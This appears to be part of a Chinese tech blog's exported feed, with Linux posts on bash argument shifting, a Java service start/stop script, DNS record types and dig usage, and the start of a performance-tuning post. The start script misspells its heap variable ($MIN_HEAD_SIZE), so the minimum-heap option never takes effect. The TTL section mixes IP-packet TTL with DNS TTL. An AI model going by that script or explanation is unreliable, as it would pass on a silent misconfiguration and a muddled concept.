<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">while</span> [ <span class="variable">$#</span> -ne 0 ]</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"第一个参数为: <span class="variable">$1</span> 参数个数为: <span class="variable">$#</span>"</span></span><br><span class="line">        <span class="built_in">shift</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p>输出结果:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@aa <span class="built_in">test</span>]<span class="comment"># ./shift.sh a b c d e f</span></span><br><span class="line">第一个参数为: a 参数个数为: 6</span><br><span class="line">第一个参数为: b 参数个数为: 5</span><br><span class="line">第一个参数为: c 参数个数为: 4</span><br><span class="line">第一个参数为: d 参数个数为: 3</span><br><span class="line">第一个参数为: e 参数个数为: 2</span><br><span class="line">第一个参数为: f 参数个数为: 1</span><br></pre></td></tr></table></figure>
<h1 id="启动脚本"><a href="#启动脚本" class="headerlink" title="启动脚本"></a>启动脚本</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取第一个启动参数</span></span><br><span class="line"><span class="keyword">case</span> <span class="variable">$1</span> <span class="keyword">in</span></span><br><span class="line"></span><br><span class="line">start)</span><br><span class="line"><span class="comment"># 堆内存设置</span></span><br><span class="line">MIN_HEAP_SIZE=<span class="string">'-Xms128m'</span></span><br><span class="line">MAX_HEAP_SIZE=<span class="string">'-Xmx512m'</span></span><br><span class="line"></span><br><span class="line">DATE=<span class="string">"`date '+%Y%m%d%H%M'`"</span></span><br><span class="line"><span class="comment"># log dir</span></span><br><span class="line">LOG_DIR=<span class="string">"/app/logs/life-<span class="variable">$DATE</span>.log"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$LOG_DIR</span></span><br><span class="line"><span class="comment"># app name</span></span><br><span class="line"></span><br><span class="line">APP=<span class="string">"life-0.0.1-SNAPSHOT.jar"</span></span><br><span class="line"><span class="comment"># start app</span></span><br><span class="line">nohup java -jar <span class="variable">$MIN_HEAD_SIZE</span> <span class="variable">$MAX_HEAP_SIZE</span> <span class="variable">$APP</span> &gt;<span class="variable">$LOG_DIR</span> &amp;</span><br><span class="line"></span><br><span class="line">;;</span><br><span class="line"></span><br><span class="line"><span class="comment">## 停止服务</span></span><br><span class="line">stop)</span><br><span class="line"></span><br><span class="line"><span class="comment">## 服务名称</span></span><br><span class="line">SERVICE=<span class="string">"life-"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 服务PID(排除grep本身进程)</span></span><br><span class="line">PID=$(ps -ef | grep <span class="variable">$SERVICE</span> | grep -v <span class="string">"grep"</span> | awk <span class="string">'&#123;print $2&#125;'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断PID是否存在</span></span><br><span class="line"><span class="keyword">if</span> [[ ! -z <span class="string">"<span class="variable">$PID</span>"</span> ]] <span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">"The PID is <span class="variable">$PID</span>,will be killed."</span></span><br><span class="line">   <span class="built_in">kill</span> -9 <span class="variable">$PID</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">"There's no service to stop."</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">;;</span><br><span class="line"></span><br><span class="line"><span class="comment">## 重启服务</span></span><br><span class="line">restart)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">shift</span></span><br><span class="line">    <span class="comment"># 先停止服务</span></span><br><span class="line">    <span class="string">"<span class="variable">$0</span>"</span> stop <span class="variable">$&#123;@&#125;</span></span><br><span class="line">    sleep 3</span><br><span class="line">    <span class="comment"># 启动服务</span></span><br><span class="line">    <span class="string">"<span class="variable">$0</span>"</span> start <span class="variable">$&#123;@&#125;</span></span><br><span class="line"></span><br><span class="line"> ;;</span><br><span class="line"></span><br><span class="line"><span class="comment">## 输入其他信息返回提示信息</span></span><br><span class="line">*)</span><br><span class="line"></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">"Usage: <span class="variable">$0</span> &#123;start|stop|restart&#125;"</span></span><br><span class="line">  ;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure>
<p>简单的服务脚本已 ok。</p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>dig使用</title>
    <url>/2019/05/27/linux/dig%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>DNS 是指：域名系统（Domain Name System）。在 Internet 上域名与 IP 地址之间是一一对应的，域名虽然便于人们记忆，但机器之间只能互相认识 IP 地址，它们之间的转换工作称为域名解析，域名解析需要由专门的域名解析系统来完成，DNS 就是进行域名解析的系统。</p>
<p>DNS 协议运行在 UDP 协议之上，使用端口号 53。在传输层 TCP 提供端到端可靠的服务,在 UDP 端提供尽力交付的服务。其控制端口作用于 UDP 端口 53。</p>
<a id="more"></a>
<h1 id="DNS-解析"><a href="#DNS-解析" class="headerlink" title="DNS 解析"></a>DNS 解析</h1><h2 id="DNS-记录"><a href="#DNS-记录" class="headerlink" title="DNS 记录"></a>DNS 记录</h2><p>Domain Name System 域名管理系统 域名是由圆点分开一串单词或缩写组成的，每一个域名都对应一个惟一的 IP 地址，这一命名的方法或这样管理域名的系统叫做域名管理系统。DNS：Domain Name Server 域名服务器 域名虽然便于人们记忆，但网络中的计算机之间只能互相认识 IP 地址，它们之间的转换工作称为域名解析，域名解析需要由专门的域名解析服务器来完成，DNS 就是进行域名解析的服务器。DNS 记录的类型有: A 记录、NS 记录、MX 记录、CNAME 记录、TXT 记录、TTL 值、PTR 值。</p>
<blockquote>
<ul>
<li>A 记录</li>
</ul>
</blockquote>
<p>A（Address）记录是用来指定主机名（或域名）对应的 IP 地址记录。用户可以将该域名下的网站服务器指向到自己的 web server 上。同时也可以设置域名的子域名。通俗来说 A 记录就是服务器的 IP,域名绑定 A 记录就是告诉 DNS,当你输入域名的时候给你引导向设置在 DNS 的 A 记录所对应的服务器。 简单的说，A 记录是指定域名对应的 IP 地址。</p>
<blockquote>
<ul>
<li>NS 记录</li>
</ul>
</blockquote>
<p>NS（Name Server）记录是域名服务器记录，用来指定该域名由哪个 DNS 服务器来进行解析。 注册域名时，总有默认的 DNS 服务器，每个注册的域名都是由一个 DNS 域名服务器来进行解析的，DNS 服务器 NS 记录地址一般以以下的形式出现： ns1.domain.com、ns2.domain.com 等。 简单的说，NS 记录是指定由哪个 DNS 服务器解析你的域名。</p>
<blockquote>
<ul>
<li>MX 记录</li>
</ul>
</blockquote>
<p>MX（Mail Exchanger）记录是邮件交换记录，它指向一个邮件服务器，用于电子邮件系统发邮件时根据收信人的地址后缀来定位邮件服务器。例如，当 Internet 上的某用户要发一封信给 user@mydomain.com 时，该用户的邮件系统通过 DNS 查找 mydomain.com 这个域名的 MX 记录，如果 MX 记录存在， 用户计算机就将邮件发送到 MX 记录所指定的邮件服务器上。</p>
<blockquote>
<ul>
<li>CNAME 记录</li>
</ul>
</blockquote>
<p>CNAME（Canonical Name ）别名记录，允许将多个名字映射到同一台计算机。通常用于同时提供 WWW 和 MAIL 服务的计算机。例如，有一台计算机名为 “host.mydomain.com”（A 记录），它同时提供 WWW 和 MAIL 服务，为了便于用户访问服务。可以为该计算机设置两个别名（CNAME）：WWW 和 MAIL， 这两个别名的全称就“www.mydomain.com”和“mail.mydomain.com”，实际上他们都指向 “host.mydomain.com”。</p>
<blockquote>
<ul>
<li>TXT 记录</li>
</ul>
</blockquote>
<p>一般指某个主机名或域名的说明，如：admin IN TXT “管理员, 电话：XXXXXXXXXXX”，mail IN TXT “邮件主机，存放在 xxx , 管理人：AAA”，Jim IN TXT “contact: abc@mailserver.com”，也就是您可以设置 TXT 内容以便使别人联系到您。 TXT 的应用之一，SPF（Sender Policy Framework）反垃圾邮件。SPF 是跟 DNS 相关的一项技术，它的内容写在 DNS 的 TXT 类型的记录里面。MX 记录的作用是给寄信者指明某个域名的邮件服务器有哪些。SPF 的作用跟 MX 相反，它向收信者表明，哪些邮件服务器是经过某个域名认可会发送邮件的。SPF 的作用主要是反垃圾邮件，主要针对那些发信人伪造域名的垃圾邮件。例如：当邮件服务器收到自称发件人是 spam@gmail.com 的邮件，那么到底它是不是真的 gmail.com 的邮件服务器发过来的呢，我们可以查询 gmail.com 的 SPF 记录，以此防止别人伪造你来发邮件。</p>
<blockquote>
<ul>
<li>TTL 值</li>
</ul>
</blockquote>
<p>TTL（Time-To-Live）原理：TTL 是 IP 协议包中的一个值，它告诉网络路由器包在网络中的时间是否太长而应被丢弃。有很多原因使包在一定时间内不能被传递到目的地。例如，不正确的路由表可能导致包的无限循环。一个解决方法就是在一段时间后丢弃这个包，然后给发送者一个报文，由发送者决定是否要重发。TTL 的初值通常是系统缺省值，是包头中的 8 位的域。TTL 的最初设想是确定一个时间范围，超过此时间就把包丢弃。由于每个路由器都至少要把 TTL 域减一，TTL 通常表示包在被丢弃前最多能经过的路由器个数。当记数到 0 时，路由器决定丢弃该包，并发送一个 ICMP 报文给最初的发送者。 简单的说，TTL 就是一条域名解析记录在 DNS 服务器中的存留时间。当各地的 DNS 服务器接受到解析请求时，就会向域名指定的 NS 服务器发出解析请求从而获得解析记录；在获得这个记录之后，记录会在 DNS 服务器中保存一段时间，这段时间内如果再接到这个域名的解析请求，DNS 服务器将不再向 NS 服务器发出请求，而是直接返回刚才获得的记录，而这个记录在 DNS 服务器上保留的时间，就是 TTL 值。 TTL 值设置的应用：一是增大 TTL 值，以节约域名解析时间，给网站访问加速。 一般情况下，域名的各种记录是极少更改的，很可能几个月、几年内都不会有什么变化。我们完全可以增大域名记录的 TTL 值让记录在各地 DNS 服务器中缓存的时间加长，这样在更长的一段时间内，我们访问这个网站时，本地 ISP 的 DNS 服务器就不需要向域名的 NS 服务器发出解析请求，而直接从缓存中返回域名解析记录。 二是减小 TTL 值，减少更换空间时的不可访问时间。 更换空间 99.9%会有 DNS 记录更改的问题，因为缓存的问题，新的域名记录在有的地方可能生效了，但在有的地方可能等上一两天甚至更久才生效。结果就是有的人可能访问到了新服务器，有的人访问到了旧服务器。仅仅是访问的话，这也不是什么大问题，但如果涉及到了邮件发送，这个就有点麻烦了，说不定哪封重要信件就被发送到了那已经停掉的旧服务器上。 为了尽可能的减小这个各地的解析时间差，合理的做法是： 第一步，先查看域名当前的 TTL 值，我们假定是 1 天。 第二步，修改 TTL 值为可设定的最小值，可能的话，建议为 1 分钟，就是 60。 第三步，等待一天，保证各地的 DNS 服务器缓存都过期并更新了记录。 第四步，设置修改新记录，这个时候各地的 DNS 就能以最快的速度更新到新的记录。 第五步，确认各地的 DNS 已经更新完成后，把 TTL 值设置成您想要的值。 一般操作系统的默认 TTL 值如下： TTL=32 Windows 9x/Me ，TTL=64 LINUX ，TTL=128 Windows 200x/XP， TTL=255 Unix</p>
<blockquote>
<ul>
<li>PTR 值</li>
</ul>
</blockquote>
<p>PTR 是 pointer 的简写，用于将一个 IP 地址映射到对应的域名，也可以看成是 A 记录的反向，IP 地址的反向解析。 PTR 主要用于邮件服务器，比如邮箱 AAA@XXX.com 给邮箱 BBB@yahoo.com 发了一封邮件，yahoo 邮件服务器接到邮件时会查看这封邮件的头文件，并分析是由哪个 IP 地址发出来的，然后根据这个 IP 地址进行反向解析，如果解析结果对应 XXX.com 的 IP 地址就接受这封邮件，反之则拒绝接收这封邮件。<br>泛域名与泛解析：泛域名是指在一个域名根下，以 XXX.Domain.com 的形式表示这个域名根所有未建立的子域名。 泛解析是把*.Domain.com 的 A 记录解析到某个 IP 地址上，通过访问任意的前缀.domain.com 都能访问到你解析的站点上。</p>
<blockquote>
<ul>
<li>域名绑定</li>
</ul>
</blockquote>
<p>域名绑定是指将域名指向服务器 IP 的操作。</p>
<blockquote>
<ul>
<li>域名转向</li>
</ul>
</blockquote>
<p>域名转向又称为域名指向或域名转发，当用户地址栏中输入您的域名时，将会自动跳转到所指定的另一个域名。一般是使用短的好记的域名转向复杂难记的域名。</p>
<h2 id="记录的用法"><a href="#记录的用法" class="headerlink" title="记录的用法"></a>记录的用法</h2><p>主机记录就是域名前缀，常见用法有：</p>
<blockquote>
<ul>
<li>www</li>
</ul>
</blockquote>
<p>解析后的域名为 www.87677677.com</p>
<blockquote>
<ul>
<li>@</li>
</ul>
</blockquote>
<p>直接解析主域名 87677677.com</p>
<blockquote>
<hr>
</blockquote>
<p>**泛解析，匹配其他所有域名 <code>.87677677.com</code></p>
<h1 id="Linux-DNS-解析-dig"><a href="#Linux-DNS-解析-dig" class="headerlink" title="Linux DNS 解析(dig)"></a>Linux DNS 解析(dig)</h1><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>centos 安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install <span class="built_in">bind</span>-utils</span><br></pre></td></tr></table></figure>
<h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@docker ~]<span class="comment"># dig</span></span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.9.4-RedHat-9.9.4-73.el7_6 &lt;&lt;&gt;&gt;</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 9725</span><br><span class="line">;; flags: qr rd ra; QUERY: 1, ANSWER: 13, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="line"></span><br><span class="line">;; OPT PSEUDOSECTION:</span><br><span class="line">; EDNS: version: 0, flags:; udp: 4096</span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;.                              IN      NS</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">.                       5747    IN      NS      d.root-servers.net.</span><br><span class="line">.                       5747    IN      NS      c.root-servers.net.</span><br><span class="line">.                       5747    IN      NS      b.root-servers.net.</span><br><span class="line">.                       5747    IN      NS      a.root-servers.net.</span><br><span class="line">.                       5747    IN      NS      m.root-servers.net.</span><br><span class="line">.                       5747    IN      NS      k.root-servers.net.</span><br><span class="line">.                       5747    IN      NS      f.root-servers.net.</span><br><span class="line">.                       5747    IN      NS      l.root-servers.net.</span><br><span class="line">.                       5747    IN      NS      j.root-servers.net.</span><br><span class="line">.                       5747    IN      NS      g.root-servers.net.</span><br><span class="line">.                       5747    IN      NS      i.root-servers.net.</span><br><span class="line">.                       5747    IN      NS      e.root-servers.net.</span><br><span class="line">.                       5747    IN      NS      h.root-servers.net.</span><br><span class="line"></span><br><span class="line">;; Query time: 40 msec</span><br><span class="line">;; SERVER: 8.8.8.8<span class="comment">#53(8.8.8.8)</span></span><br><span class="line">;; WHEN: 一 5月 27 22:37:23 CST 2019</span><br><span class="line">;; MSG SIZE  rcvd: 239</span><br></pre></td></tr></table></figure>
<p><img src="/2019/05/27/linux/dig使用/dig_20190527144531.png" alt></p>
<p>dig 命令默认的输出信息比较丰富,大概可以分为 5 个部分。</p>
<blockquote>
<ul>
<li>第一部分显示 dig 命令的版本和输入的参数。</li>
<li>第二部分显示服务返回的一些技术详情，比较重要的是 status。如果 status 的值为 NOERROR 则说明本次查询成功结束。</li>
<li>第三部分中的 “QUESTION SECTION” 显示我们要查询的域名。</li>
<li>第四部分的 “ANSWER SECTION” 是查询到的结果。</li>
<li>第五部分则是本次查询的一些统计信息，比如用了多长时间，查询了哪个 DNS 服务器，在什么时间进行的查询等等。</li>
</ul>
</blockquote>
<p>dig -h 帮助命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@docker ~]<span class="comment"># dig -h</span></span><br><span class="line">Usage:  dig [@global-server] [domain] [q-type] [q-class] &#123;q-opt&#125;</span><br><span class="line">            &#123;global<span class="_">-d</span>-opt&#125; host [@<span class="built_in">local</span>-server] &#123;<span class="built_in">local</span><span class="_">-d</span>-opt&#125;</span><br><span class="line">            [ host [@<span class="built_in">local</span>-server] &#123;<span class="built_in">local</span><span class="_">-d</span>-opt&#125; [...]]</span><br><span class="line">Where:  domain    is <span class="keyword">in</span> the Domain Name System</span><br><span class="line">        q-class  is one of (<span class="keyword">in</span>,hs,ch,...) [default: <span class="keyword">in</span>]</span><br><span class="line">        q-type   is one of (a,any,mx,ns,soa,hinfo,axfr,txt,...) [default:a]</span><br><span class="line">                 (Use ixfr=version <span class="keyword">for</span> <span class="built_in">type</span> ixfr)</span><br><span class="line">        q-opt    is one of:</span><br><span class="line">                 -x dot-notation     (shortcut <span class="keyword">for</span> reverse lookups)</span><br><span class="line">                 -i                  (use IP6.INT <span class="keyword">for</span> IPv6 reverse lookups)</span><br><span class="line">                 -f filename         (batch mode)</span><br><span class="line">                 -b address[<span class="comment">#port]   (bind to source address/port)</span></span><br><span class="line">                 -p port             (specify port number)</span><br><span class="line">                 -q name             (specify query name)</span><br><span class="line">                 -t <span class="built_in">type</span>             (specify query <span class="built_in">type</span>)</span><br><span class="line">                 -c class            (specify query class)</span><br><span class="line">                 -k keyfile          (specify tsig key file)</span><br><span class="line">                 -y [hmac:]name:key  (specify named base64 tsig key)</span><br><span class="line">                 -4                  (use IPv4 query transport only)</span><br><span class="line">                 -6                  (use IPv6 query transport only)</span><br><span class="line">                 -m                  (<span class="built_in">enable</span> memory usage debugging)</span><br><span class="line">        d-opt    is of the form +keyword[=value], <span class="built_in">where</span> keyword is:</span><br><span class="line">                 +[no]vc             (TCP mode)</span><br><span class="line">                 +[no]tcp            (TCP mode, alternate syntax)</span><br><span class="line">                 +time=<span class="comment">###           (Set query timeout) [5]</span></span><br><span class="line">                 +tries=<span class="comment">###          (Set number of UDP attempts) [3]</span></span><br><span class="line">                 +retry=<span class="comment">###          (Set number of UDP retries) [2]</span></span><br><span class="line">                 +domain=<span class="comment">###         (Set default domainname)</span></span><br><span class="line">                 +bufsize=<span class="comment">###        (Set EDNS0 Max UDP packet size)</span></span><br><span class="line">                 +ndots=<span class="comment">###          (Set NDOTS value)</span></span><br><span class="line">                 +[no]edns[=<span class="comment">###]     (Set EDNS version) [0]</span></span><br><span class="line">                 +[no]search         (Set whether to use searchlist)</span><br><span class="line">                 +[no]showsearch     (Search with intermediate results)</span><br><span class="line">                 +[no]defname        (Ditto)</span><br><span class="line">                 +[no]recurse        (Recursive mode)</span><br><span class="line">                 +[no]ignore         (Don<span class="string">'t revert to TCP for TC responses.)</span></span><br><span class="line"><span class="string">                 +[no]fail           (Don'</span>t try next server on SERVFAIL)</span><br><span class="line">                 +[no]besteffort     (Try to parse even illegal messages)</span><br><span class="line">                 +[no]aaonly         (Set AA flag <span class="keyword">in</span> query (+[no]aaflag))</span><br><span class="line">                 +[no]adflag         (Set AD flag <span class="keyword">in</span> query)</span><br><span class="line">                 +[no]cdflag         (Set CD flag <span class="keyword">in</span> query)</span><br><span class="line">                 +[no]cl             (Control display of class <span class="keyword">in</span> records)</span><br><span class="line">                 +[no]cmd            (Control display of <span class="built_in">command</span> line)</span><br><span class="line">                 +[no]comments       (Control display of comment lines)</span><br><span class="line">                 +[no]rrcomments     (Control display of per-record comments)</span><br><span class="line">                 +[no]question       (Control display of question)</span><br><span class="line">                 +[no]answer         (Control display of answer)</span><br><span class="line">                 +[no]authority      (Control display of authority)</span><br><span class="line">                 +[no]additional     (Control display of additional)</span><br><span class="line">                 +[no]stats          (Control display of statistics)</span><br><span class="line">                 +[no]short          (Disable everything except short</span><br><span class="line">                                      form of answer)</span><br><span class="line">                 +[no]ttlid          (Control display of ttls <span class="keyword">in</span> records)</span><br><span class="line">                 +[no]all            (Set or clear all display flags)</span><br><span class="line">                 +[no]qr             (Print question before sending)</span><br><span class="line">                 +[no]nssearch       (Search all authoritative nameservers)</span><br><span class="line">                 +[no]identify       (ID responders <span class="keyword">in</span> short answers)</span><br><span class="line">                 +[no]trace          (Trace delegation down from root [+dnssec])</span><br><span class="line">                 +[no]dnssec         (Request DNSSEC records)</span><br><span class="line">                 +[no]nsid           (Request Name Server ID)</span><br><span class="line">                 +[no]sigchase       (Chase DNSSEC signatures)</span><br><span class="line">                 +trusted-key=<span class="comment">####   (Trusted Key when chasing DNSSEC sigs)</span></span><br><span class="line">                 +[no]topdown        (Do DNSSEC validation top down mode)</span><br><span class="line">                 +[no]split=<span class="comment">##       (Split hex/base64 fields into chunks)</span></span><br><span class="line">                 +[no]multiline      (Print records <span class="keyword">in</span> an expanded format)</span><br><span class="line">                 +[no]onesoa         (AXFR prints only one soa record)</span><br><span class="line">        global d-opts and servers (before host name) affect all queries.</span><br><span class="line">        <span class="built_in">local</span> d-opts and servers (after host name) affect only that lookup.</span><br><span class="line">        -h                           (<span class="built_in">print</span> <span class="built_in">help</span> and <span class="built_in">exit</span>)</span><br><span class="line">        -v                           (<span class="built_in">print</span> version and <span class="built_in">exit</span>)</span><br></pre></td></tr></table></figure>
<h4 id="dig-跟踪解析信息"><a href="#dig-跟踪解析信息" class="headerlink" title="dig 跟踪解析信息"></a>dig 跟踪解析信息</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@docker ~]<span class="comment"># dig www.baidu.com</span></span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.9.4-RedHat-9.9.4-73.el7_6 &lt;&lt;&gt;&gt; www.baidu.com</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 49066</span><br><span class="line">;; flags: qr rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="line"></span><br><span class="line">;; OPT PSEUDOSECTION:</span><br><span class="line">; EDNS: version: 0, flags:; udp: 4096</span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;www.baidu.com.                 IN      A</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">www.baidu.com.          559     IN      CNAME   www.a.shifen.com.</span><br><span class="line">www.a.shifen.com.       265     IN      A       220.181.38.150</span><br><span class="line">www.a.shifen.com.       265     IN      A       220.181.38.149</span><br><span class="line"></span><br><span class="line">;; Query time: 12 msec</span><br><span class="line">;; SERVER: 8.8.8.8<span class="comment">#53(8.8.8.8)</span></span><br><span class="line">;; WHEN: ? 5? 27 19:06:53 CST 2019</span><br><span class="line">;; MSG SIZE  rcvd: 101</span><br></pre></td></tr></table></figure>
<h4 id="4-查看域名对应的-IP-信息"><a href="#4-查看域名对应的-IP-信息" class="headerlink" title="-4 查看域名对应的 IP 信息"></a>-4 查看域名对应的 IP 信息</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@docker ~]<span class="comment"># dig -4 baidu.com</span></span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.9.4-RedHat-9.9.4-73.el7_6 &lt;&lt;&gt;&gt; -4 baidu.com</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 63475</span><br><span class="line">;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="line"></span><br><span class="line">;; OPT PSEUDOSECTION:</span><br><span class="line">; EDNS: version: 0, flags:; udp: 4096</span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;baidu.com.                     IN      A</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">baidu.com.              69      IN      A       123.125.114.144</span><br><span class="line">baidu.com.              69      IN      A       220.181.57.216</span><br><span class="line"></span><br><span class="line">;; Query time: 17 msec</span><br><span class="line">;; SERVER: 8.8.8.8<span class="comment">#53(8.8.8.8)</span></span><br><span class="line">;; WHEN: 一 5月 27 23:13:13 CST 2019</span><br><span class="line">;; MSG SIZE  rcvd: 70</span><br></pre></td></tr></table></figure>
<h4 id="trace-跟踪整个解析过程"><a href="#trace-跟踪整个解析过程" class="headerlink" title="+trace 跟踪整个解析过程"></a>+trace 跟踪整个解析过程</h4><p>dig 非常著名的一个查询选项就是+trace，当使用这个查询选项后，dig 会从根域查询一直跟踪直到查询到最终结果，并将整个过程信息输出出来。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@docker ~]<span class="comment"># dig +trace  www.baidu.com</span></span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.9.4-RedHat-9.9.4-73.el7_6 &lt;&lt;&gt;&gt; +trace www.baidu.com</span><br><span class="line">;; global options: +cmd</span><br><span class="line">.                       17828   IN      NS      m.root-servers.net.</span><br><span class="line">.                       17828   IN      NS      i.root-servers.net.</span><br><span class="line">.                       17828   IN      NS      k.root-servers.net.</span><br><span class="line">.                       17828   IN      NS      g.root-servers.net.</span><br><span class="line">.                       17828   IN      NS      l.root-servers.net.</span><br><span class="line">.                       17828   IN      NS      j.root-servers.net.</span><br><span class="line">.                       17828   IN      NS      a.root-servers.net.</span><br><span class="line">.                       17828   IN      NS      c.root-servers.net.</span><br><span class="line">.                       17828   IN      NS      b.root-servers.net.</span><br><span class="line">.                       17828   IN      NS      h.root-servers.net.</span><br><span class="line">.                       17828   IN      NS      d.root-servers.net.</span><br><span class="line">.                       17828   IN      NS      f.root-servers.net.</span><br><span class="line">.                       17828   IN      NS      e.root-servers.net.</span><br><span class="line">.                       84718   IN      RRSIG   NS 8 0 518400 20190608170000 20190526160000 25266 . puMtHfihNwO4XbPLjH4y0H1pRc7OTrzIYcXQksxj4n6XIotEV/nwmVoi K/8fuqubwtjF2lNLh/ppB/cZNFT7GWA3sZuAF4l1Gfpy5iI5+sxEE2O8 NdTCnj4GRW6/sOF/j3rWb6UmaoqHlqRTTGDyH+NAayUHc3DuOIp9tWzZ x2DVnZrSnioDFr4ypvuMC9knXosE5+FMuQKJBx53i+UB510x0B3iGOs7 h/hTnjgW4eKCvvPq657coHZo5ak9KO0fjOFZ+6qw+uNx2NfqvybnUm/7 bs1AiF0yOxUPYwolQSWEsr2xaGQTHqf4Hk8etO7BJoFnlw92CTOeZj0m HI8Jig==</span><br><span class="line">;; Received 525 bytes from 8.8.8.8<span class="comment">#53(8.8.8.8) in 6469 ms</span></span><br><span class="line"></span><br><span class="line">www.baidu.com.          3       IN      CNAME   www.a.shifen.com.</span><br><span class="line">www.a.shifen.com.       8       IN      A       220.181.38.150</span><br><span class="line">www.a.shifen.com.       8       IN      A       220.181.38.149</span><br><span class="line">;; Received 101 bytes from 192.33.4.12<span class="comment">#53(c.root-servers.net) in 7 ms</span></span><br></pre></td></tr></table></figure>
<h4 id="x-根据-IP-反查域名"><a href="#x-根据-IP-反查域名" class="headerlink" title="-x 根据 IP 反查域名"></a>-x 根据 IP 反查域名</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@docker ~]<span class="comment"># dig -x 8.8.8.8</span></span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.9.4-RedHat-9.9.4-73.el7_6 &lt;&lt;&gt;&gt; -x 8.8.8.8</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 37738</span><br><span class="line">;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="line"></span><br><span class="line">;; OPT PSEUDOSECTION:</span><br><span class="line">; EDNS: version: 0, flags:; udp: 4096</span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;8.8.8.8.in-addr.arpa.          IN      PTR</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">8.8.8.8.in-addr.arpa.   8107    IN      PTR     google-public-dns-a.google.com.</span><br><span class="line"></span><br><span class="line">;; Query time: 32 msec</span><br><span class="line">;; SERVER: 8.8.8.8<span class="comment">#53(8.8.8.8)</span></span><br><span class="line">;; WHEN: 一 5月 27 23:08:36 CST 2019</span><br><span class="line">;; MSG SIZE  rcvd: 93</span><br></pre></td></tr></table></figure>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><a href="http://roclinux.cn/?p=2449" target="_blank" rel="noopener">《dig 挖出 DNS 的秘密》-linux 命令五分钟系列之三十四</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux性能调优</title>
    <url>/2019/02/20/linux/Linux%E6%80%A7%E8%83%BD%E8%B0%83%E4%BC%98/</url>
    <content><![CDATA[<p><img src="/2019/02/20/linux/Linux性能调优/linux_optimize.png" alt><br>此图涉及到CPU、内存、IO、网络等各种命令。本节也主要从这四个方面来介绍linux性能调优.</p>
